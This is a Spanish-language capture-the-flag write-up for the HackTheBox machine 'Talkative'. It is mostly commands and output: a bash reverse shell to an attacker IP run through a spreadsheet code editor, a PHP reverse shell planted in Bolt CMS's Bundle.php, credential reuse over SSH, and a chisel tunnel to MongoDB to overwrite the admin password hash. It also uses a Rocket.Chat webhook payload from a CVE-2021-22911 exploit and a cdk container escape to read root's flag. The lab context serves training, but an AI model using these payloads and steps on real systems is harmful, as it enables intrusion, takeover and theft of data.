---
title: Talkative hackthebox writeup
author: HackerCloud
date: 2022-08-30 00:00:00 +0800
categories: [Hackthebox, machine, writeup]
tags: [Hackthebox, writeup]
image:
  path: ../../assets/img/commons/talkative-writeup/Talkative.png
  width: 800
  height: 500
  alt: Banner Talkative
---

Empezamos con el escaneo de nmap sobre los puertos de la máquina

```bash
❯ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.155 -oG allPorts
Scanning 10.10.11.155 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.155
Discovered open port 80/tcp on 10.10.11.155
Discovered open port 8081/tcp on 10.10.11.155
Discovered open port 3000/tcp on 10.10.11.155
Discovered open port 8082/tcp on 10.10.11.155
Nmap scan report for 10.10.11.155
PORT     STATE SERVICE         REASON
80/tcp   open  http            syn-ack ttl 62
3000/tcp open  ppp             syn-ack ttl 62
8080/tcp open  http-proxy      syn-ack ttl 62
8081/tcp open  blackice-icecap syn-ack ttl 62
8082/tcp open  blackice-alerts syn-ack ttl 62
```

Con curl podemos ver un dominio

```html
❯ curl 10.10.11.155
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://talkative.htb">here</a>.</p>
<hr>
</body></html>
```

En el puerto 80 no encontramos nada interesante, podemos ir al puerto 8080 a ver su contenido

Podemos ver que hay una aplicación de Hoja de cálculo normal, tenemos disponible un editor que nos permite ejecutar código, vamos a intentar ejecutar una reverse shell

En este caso voy a usar esta reverse shell `system('bash -c "bash -i >& /dev/tcp/10.10.14.75/1234 0>&1"')`

Y nos llega una shell, se puede ver que es un contenedor, pero podemos ver cosas

```bash
❯ sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 45940
root@b06821bbda78:/# whoami
whoami
root
root@b06821bbda78:/# hostname -I
hostname -I
172.18.0.2 
root@b06821bbda78:/#
```

Encontramos el archivo `/root/bolt-administration.omv`, no tenemos nada dentro de la máquina para poder descargar este archivo en nuestra máquina, podemos usar pwncat-cs para descargarlo

Una vez descargado podemos ver que contiene usuarios y contraseñas

~~~
matt
janit
saul
jeO09ufhWD<s
bZ89h}V<S_DA
)SQWGm>9KHEA
~~~

Dentro de http://talkative.htb hay un directorio bolt, el cual contiene un Login, podemos probar las crendenciales que hemos encontrado

El usuario admin funciona con la contraseña `jeO09ufhWD<s`  

Una vez iniciada la sesión podemos ver un apartado de configuración, dentro hay un apartado llamado `All Configuration Files`, vamos a ver su contenido

Podemos ver un archivo llamado `Bundle.php` , le damos click y metemos una reverse shell en php dentro

Nos ponemos en escucha con Netcat y nos llega una reverse shell como www-data, podemos ver que estamos en un contenedor

```bash
❯ sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 57846
www-data@b922262b694b:/var/www/talkative.htb/bolt/public$ hostname -I
hostname -I
172.17.0.15 
```

Este contenedor no nos da mucha información, podemos probar las credenciales encontradas anteriormente por SSH

```bash
www-data@b922262b694b:/var/www/talkative.htb/bolt/public$ ssh saul@172.17.0.1
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
saul@172.17.0.1 password: jeO09ufhWD<s
saul@talkative:~$ whoami
saul
saul@talkative:~$ cat user.txt 
cd8c******cb258c950d9edcc065
```

Con pspy descubrimos este proceso

```bash
CMD: UID=0    PID=4894   | /bin/sh -c python3 /root/.backup/update_mongo.py
```

```bash
saul@talkative:~$ netstat -nat
tcp        0      0 172.17.0.1:43752        172.17.0.2:27017        TIME_WAIT
```

Vemos el puerto de mongo abierto, por defecto es el 27017

Con [chisel](https://github.com/jpillora/chisel) tunelizamos la conexión hacia nuestra máquina

```bash
❯ chisel server --reverse --port 8000
2022/08/30 17:21:20 server: Reverse tunnelling enabled
2022/08/30 17:21:20 server: Fingerprint 4iFocLbXWmRvOoiAYCwK9t8TfvcH6MJOSR1ngLYhgoM=
2022/08/30 17:21:20 server: Listening on http://0.0.0.0:8000
```

```bash
saul@talkative:~$  ./chisel client 10.10.14.75:8000 R:27017:172.17.0.2:27017
2022/08/30 15:25:37 client: Connecting to ws://10.10.14.75:8000
2022/08/30 15:25:37 client: Connected (Latency 38.916105ms)
```

Ahora podemos intentar conectarnos a mongoDB e intentar cambiar la contraseña del usuario administrador de la web

```bash
rs0 [direct: primary] test> show databases
admin   104.00 KiB
config  124.00 KiB
local    11.69 MiB
meteor    4.91 MiB
rs0 [direct: primary] test> use meteor
switched to db meteor
rs0 [direct: primary] meteor> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 1,
  upsertedCount: 0
}
```

Ahora como tenemos tunelizada la conexión tenemos que meternos por el puerto 8000

Podemos ir al apartado de Administración>integraciones para crear una nueva integración

Nueva integración>WebHook entrante

Habilitado: Verdadero
Nomb: Shell
Canal: #general
Publicar como: admin
script habilitado: verdadero

Vamos a usar la primera línea de este [exploit](https://github.com/CsEnox/CVE-2021-22911/blob/main/exploit.py) 

```bash
const require = console.log.constructor('return process.mainModule.require')();
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.75/1234 0>&1"');
```

Lo guardamos y hacemos un curl a la URL con nuestro Token

```bash
❯ curl http://talkative.htb:3000/hooks/hA7ZNgGYHtRhpYBjH/CsNw6amXPMXR4PH9SANT7cyrFaDwhMpLNiiCwHzX9gCfwXcc
{"success":false}
```

```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 57468
root@c150397ccd63:/app/bundle/programs/server# hostname -I
hostname -I
172.17.0.3
```

Ahora con pwncat-cs un cdk podemos conseguir archivos de la máquina real, podemos leer directamente la flag.

```bash
❯ pwncat-cs -lp 1234
[17:41:55] Welcome to pwncat 🐈!                                                                                                               
(local) pwncat$ upload cdk /root/cdk
/root/cdk
[17:42:12] uploaded 11.91MiB in 6.67 seconds                                                                                                      
(local) pwncat$ back
(remote) root@c150397ccd63:/app/bundle/programs/server# cd /root
(remote) root@c150397ccd63:/root# chmod +x cdk                                                                                                               
(remote) root@c150397ccd63:/root# ./cdk run cap-dac-read-search /root/root.txt                                                                               
Running with target: /root/root.txt, ref: /etc/hostname
57ebcfafa23a47da6507a95d1307beff
(remote) root@c150397ccd63:/root#
```

